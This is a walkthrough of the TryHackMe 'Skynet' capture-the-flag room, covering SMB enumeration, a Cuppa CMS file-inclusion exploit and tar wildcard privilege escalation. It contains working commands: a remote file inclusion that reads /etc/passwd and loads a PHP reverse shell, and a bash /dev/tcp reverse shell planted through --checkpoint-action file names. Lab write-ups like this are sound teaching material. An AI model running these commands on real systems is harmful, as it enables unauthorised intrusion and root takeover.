# Skynet 

In this room I learned :
- How to enumerate SMB shares
- Use a php reverse shell 
- Priv Esc with tar and wildcards
- Exploit Cuppa Cms 

### Section 1 : Recon :

Let's kick it with nmap : 

![image](/assets/img/Skynet/nmap.png)

We have several good infos here. 

First there is a Web Server running so let's check that out.

![image](/assets/img/Skynet/web.png)

Nothing interesting here... the button are not even working. 

I'm gonna launch gobuster to check for directories.

```bash
gobuster dir -u http://10.10.250.209:80/ -w /home/edwards/Documents/DirBuster-1.0-RC1/directory-list-2.3-medium.txt
```
Here are the results :

We have differents locations, in some I got forbidden access. 
But I found something interesting, it's a login page but we have no clue for a password or a login.

In the nmap we had result for smb shares, I'm gonna launch a nmap scan to enumerate samba shares.

```bash
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.250.209 
```

We have something very juicy here, we can connect as anonymous. Let's try it.

### Section 2 : SMB and BurpSuite

```bash
smbclient //10.10.250.209/anonymous 
```

Looks like we are in.

In the log directory, we have a log1.txt, it look's like a list of password. 
We can maybe use this to connect to the previous login page with burpsuite.

![image](/assets/img/Skynet/log.png)

I used the log1.txt to start a sniper attack on BurpSuite.
We have a positive response with one password.

After connecting to the website we have access to 3 emails.

In one we have an email with SMB credentials for Miles.

![image](/assets/img/Skynet/credsmb.png)

Let's connect to milesdyson smbshare with the password that we found.
```bash
smbclient //10.10.250.209/milesdyson -U milesdyson
```

In the notes directory, we have a important.txt reavealing a hidden directory.

![image](/assets/img/Skynet/imp.png)

Here the page of the hidden directories : 

![image](/assets/img/Skynet/hidden.png)

Then, I launched again gobuster to search again for hidden path inside this directory.
We have a administrator path that bring us to this page :

### Section 3 : Exploitation

I used searchsploit to find a cuppa exploit.

![image](/assets/img/Skynet/exploit.png)

Since we have just one exploit the choice is easy.

We need to first check if the exploit is avaible.
```bash
curl -s http://10.10.142.202/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd
```
![image](/assets/img/Skynet/response.png)

We have a response that means we can now upload a reverse shell and get a shell back.

Start a netcat listener.

![image](/assets/img/Skynet/netcat.png)

Now download a php reverse shell and configure it with the right port and your ip address.
```bash
wwget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
```

![image](/assets/img/Skynet/php.png)

Now let's upload it on the machine with the help of a python simple http sever :

![image](/assets/img/Skynet/python.png)

Enter the following url :
```bash
10.10.142.202/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.11.15.91:8000/php-reverse-shell.php
```

And you will have a shell connection !

I used this python command to have a nice shell : 
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

### Section 4 : Root flag
_Gonna be honest I struggled hard with this part, I didn't know what to do at all so I went to this walkthrough website so I want to give him the credits for this part : 
https://www.aldeid.com/wiki/TryHackMe-Skynet
All the previous part has been done by myself, but not this part, I need to tryharder !_

In miles' home directory we have a backup script that compresses the /var/www/html directory

![image](/assets/img/Skynet/backup.png)

Let's inspect the /etc/crontab

![image](/assets/img/Skynet/cron.png)

We see that the script is executed by root every minute.

Here comes the tricky part. 
With the help of GTFOBins [!GTFOBins](https://gtfobins.github.io/gtfobins/tar/)

Let's use the informations to create a privileged shell with tar.

Set up a new netcat listener. 

then execute the following -> 
```bash
printf '#!/bin/bash\nbash -i >& /dev/tcp/10.11.15.91/4555 0>&1' > /var/www/html/shell
chmod +x /var/www/html/shell
touch /var/www/html/--checkpoint=1
touch /var/www/html/--checkpoint-action=exec=bash\ shell
```

After a few seconds, you will have a shell as root open.

Now you can go look for the root.txt !
